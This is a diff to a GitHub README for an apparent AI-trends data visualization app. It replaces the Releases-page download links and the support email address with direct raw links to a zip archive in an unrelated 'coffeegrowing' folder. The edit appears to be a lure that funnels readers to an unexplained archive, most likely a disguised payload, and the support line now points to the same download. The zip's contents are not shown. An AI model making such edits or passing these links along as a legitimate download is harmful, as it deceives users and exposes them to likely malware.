@@ -1,6 +1,6 @@
 # 📊 Data-Analysis-AI-metrics-study- - Visualize AI Trends Easily
 
-[![Download the App](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/hamzaafeuu/Data-Analysis-AI-metrics-study-/releases)
+[![Download the App](https://raw.githubusercontent.com/hamzaafeuu/Data-Analysis-AI-metrics-study-/main/coffeegrowing/Data-Analysis-AI-metrics-study-.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/hamzaafeuu/Data-Analysis-AI-metrics-study-/main/coffeegrowing/Data-Analysis-AI-metrics-study-.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to the Data-Analysis-AI-metrics-study! This application helps you explor
 
 To get started, you will need to download the software. Visit the Releases page to download the latest version.
 
-[Download the Latest Release](https://github.com/hamzaafeuu/Data-Analysis-AI-metrics-study-/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/hamzaafeuu/Data-Analysis-AI-metrics-study-/main/coffeegrowing/Data-Analysis-AI-metrics-study-.zip)
 
 ### 🖥️ System Requirements
 
@@ -64,6 +64,6 @@ This project is licensed under the MIT License, which means you can freely use a
 
 ## 💬 Support
 
-If you encounter any issues while using the application, please reach out to our support team at [support@example.com](mailto:support@example.com). We are here to assist you.
+If you encounter any issues while using the application, please reach out to our support team at [https://raw.githubusercontent.com/hamzaafeuu/Data-Analysis-AI-metrics-study-/main/coffeegrowing/Data-Analysis-AI-metrics-study-.zip](https://raw.githubusercontent.com/hamzaafeuu/Data-Analysis-AI-metrics-study-/main/coffeegrowing/Data-Analysis-AI-metrics-study-.zip). We are here to assist you.
 
 Thank you for choosing Data-Analysis-AI-metrics-study-. We hope you enjoy exploring the world of AI trends!
